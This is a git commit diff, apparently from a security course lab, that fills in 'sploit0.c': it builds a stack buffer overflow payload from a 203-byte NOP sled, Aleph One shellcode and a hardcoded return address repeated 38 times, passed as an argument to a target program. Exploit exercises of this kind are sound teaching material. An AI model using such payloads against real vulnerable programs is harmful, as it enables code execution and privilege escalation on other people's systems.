0f16f7760d9752f20eef9e5682e771a367baf349
pandaxuCESO <49774769+30PandaX@users.noreply.github.com>
2021-12-07 21:25:16 -0500

    sp0

--- sploits/sploit0.c
+++ sploits/sploit0.c
@@ -11,9 +11,21 @@ int main(void)
 {
   char *args[3]; 
   char *env[1];
-  
+
+  char *noop = "\x90";
+  char *address = "\xf8\xf2\xff\xbf";
+  int sled_length = 203;
+
+  char *result = malloc(sizeof(noop)*sled_length + sizeof(shellcodeAlephOne) + sizeof(address)*38 + 1);
+  char *result1 = repeat(noop, sled_length);
+  strcat(result, result1);
+
+  strcat(result, shellcodeAlephOne);
+
+  char *result2 = repeat(address, 38);
+  strcat(result, result2);
   args[0] = TARGET;
-  args[1] = "student"; 
+  args[1] = result; 
   args[2] = NULL;
   
   env[0] = NULL;
